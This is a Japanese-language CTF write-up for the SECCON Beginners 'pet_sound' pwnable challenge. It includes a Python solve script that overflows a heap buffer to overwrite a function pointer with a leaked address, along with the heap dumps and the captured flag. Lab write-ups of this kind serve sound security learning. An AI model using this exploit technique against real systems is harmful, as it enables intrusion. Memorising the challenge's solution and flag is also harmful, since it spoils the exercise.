# pet_sound:pwnable:100pts
ペットに鳴き声を教えましょう。  
`nc pet-sound.challenges.beginners.seccon.jp 9090`  

[pet_sound.zip](pet_sound.zip)  

# Solution
接続先とソースが渡される。  
接続するとペットにフラグを喋らせるというミッションとともに、`speak_flag`の関数アドレスとHeapのレイアウトが表示される。  
```bash
$ nc pet-sound.challenges.beginners.seccon.jp 9090
--- Pet Hijacking ---
Your mission: Make Pet speak the secret FLAG!

[hint] The secret action 'speak_flag' is at: 0x59dc67bed492
[*] Pet A is allocated at: 0x59dc89e9f2a0
[*] Pet B is allocated at: 0x59dc89e9f2d0

[Initial Heap State]

--- Heap Layout Visualization ---
0x000059dc89e9f2a0: 0x000059dc67bed5d2 <-- pet_A->speak
0x000059dc89e9f2a8: 0x00002e2e2e6e6177 <-- pet_A->sound
0x000059dc89e9f2b0: 0x0000000000000000
0x000059dc89e9f2b8: 0x0000000000000000
0x000059dc89e9f2c0: 0x0000000000000000
0x000059dc89e9f2c8: 0x0000000000000031
0x000059dc89e9f2d0: 0x000059dc67bed5d2 <-- pet_B->speak (TARGET!)
0x000059dc89e9f2d8: 0x00002e2e2e6e6177 <-- pet_B->sound
0x000059dc89e9f2e0: 0x0000000000000000
0x000059dc89e9f2e8: 0x0000000000000000
0x000059dc89e9f2f0: 0x0000000000000000
0x000059dc89e9f2f8: 0x0000000000020d11
---------------------------------

Input a new cry for Pet A >
```
試しにペットAの鳴き声として`AAAAAAAA`を打ち込んでみる。  
```bash
~~~
Input a new cry for Pet A > AAAAAAAA

[Heap State After Input]

--- Heap Layout Visualization ---
0x000059dc89e9f2a0: 0x000059dc67bed5d2 <-- pet_A->speak
0x000059dc89e9f2a8: 0x4141414141414141 <-- pet_A->sound
0x000059dc89e9f2b0: 0x000000000000000a
0x000059dc89e9f2b8: 0x0000000000000000
0x000059dc89e9f2c0: 0x0000000000000000
0x000059dc89e9f2c8: 0x0000000000000031
0x000059dc89e9f2d0: 0x000059dc67bed5d2 <-- pet_B->speak (TARGET!)
0x000059dc89e9f2d8: 0x00002e2e2e6e6177 <-- pet_B->sound
0x000059dc89e9f2e0: 0x0000000000000000
0x000059dc89e9f2e8: 0x0000000000000000
0x000059dc89e9f2f0: 0x0000000000000000
0x000059dc89e9f2f8: 0x0000000000020d11
---------------------------------
Pet says: AAAAAAAA

Pet says: wan...
```
Aは想定通りに鳴いたが、Bはレイアウト通り`wan...`と鳴いている。  
この`pet_A->sound`からオーバフローさせて`pet_B->speak (TARGET!)`を`speak_flag`に書き換えろということらしい。  
以下のsolve.pyで行う。  
```py
from ptrlib import *

sock = Socket("nc pet-sound.challenges.beginners.seccon.jp 9090")

speak_flag = int(sock.recvlineafter("'speak_flag' is at: "), 16)
print("speak_flag:", hex(speak_flag))

payload = b"A" * 40
payload += p64(speak_flag)
sock.sendlineafter("Pet A > ", payload)

sock.sh()
```
実行する。  
```bash
$ python solve.py
[+] __init__: Successfully connected to pet-sound.challenges.beginners.seccon.jp:9090
speak_flag: 0x5d42b113b492
[ptrlib]$
[Heap State After Input]

--- Heap Layout Visualization ---
0x00005d42ef1612a0: 0x00005d42b113b5d2 <-- pet_A->speak
0x00005d42ef1612a8: 0x4141414141414141 <-- pet_A->sound
0x00005d42ef1612b0: 0x4141414141414141
0x00005d42ef1612b8: 0x4141414141414141
0x00005d42ef1612c0: 0x4141414141414141
0x00005d42ef1612c8: 0x4141414141414141
0x00005d42ef1612d0: 0x00005d42b113b492 <-- pet_B->speak (TARGET!)
0x00005d42ef1612d8: 0x00002e2e2e6e610a <-- pet_B->sound
0x00005d42ef1612e0: 0x0000000000000000
0x00005d42ef1612e8: 0x0000000000000000
0x00005d42ef1612f0: 0x0000000000000000
0x00005d42ef1612f8: 0x0000000000020d11
---------------------------------
Pet says: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x92\xb4\xb1B]

**********************************************
* Pet suddenly starts speaking flag.txt...!? *
* Pet: "ctf4b{y0u_expl0it_0v3rfl0w!}" *
**********************************************
[WARN] thread_recv: Connection closed by pet-sound.challenges.beginners.seccon.jp:9090
[+] _close_impl: Connection to pet-sound.challenges.beginners.seccon.jp:9090 closed
```
うまくオーバーフローさせ、ペットにflagを喋らせることができた。  

## ctf4b{y0u_expl0it_0v3rfl0w!}